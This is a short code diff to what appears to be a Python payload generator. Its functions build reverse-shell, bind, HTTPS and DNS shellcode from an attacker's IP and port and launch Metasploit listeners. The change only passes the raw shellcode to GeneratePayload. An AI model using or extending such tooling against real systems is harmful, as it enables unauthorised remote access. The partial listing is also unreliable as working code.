@@ -34,7 +34,7 @@ def reversePayloadGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice % (iphex, porthex)
     print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
     ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
-    GeneratePayload(ez2read_shellcode,payloadname)
+    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startRevMetasploit(portnum)
     raise KeyboardInterrupt
 
@@ -53,7 +53,7 @@ def bindPayloadGeneration(payloadchoice,payloadname):
         '\n[*] Target Bind IP Address ' + t.bold_red + '(REQUIRED FOR BIND PAYLOADS)' + t.normal +' \n[*] IP> ')
     print t.bold_green + '[*] BIND IP SET AS %s\n[*] PORT SET AS %s\n' % (bindip,bindport) + t.normal
     ez2read_shellcode, startBindMetasploit = askAndReturnModules(shellcode,'bind')
-    GeneratePayload(ez2read_shellcode,payloadname)
+    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startBindMetasploit(bindport,bindip)
 
 def httpsPayloadGeneration(payloadchoice,payloadname):
@@ -81,7 +81,7 @@ def httpsPayloadGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice % (porthex, iphex)
     print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
     ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
-    GeneratePayload(ez2read_shellcode,payloadname)
+    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startHttpsMetasploit(portnum)
 
 def dnsPayloadGeneration(payloadchoice,payloadname):
@@ -99,7 +99,7 @@ def dnsPayloadGeneration(payloadchoice,payloadname):
     shellcode = payloadchoice % (DNSaddr,porthex)
     print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
     ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
-    GeneratePayload(ez2read_shellcode,payloadname)
+    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
     startHttpsMetasploit(portnum,DNSaddr)
 
 
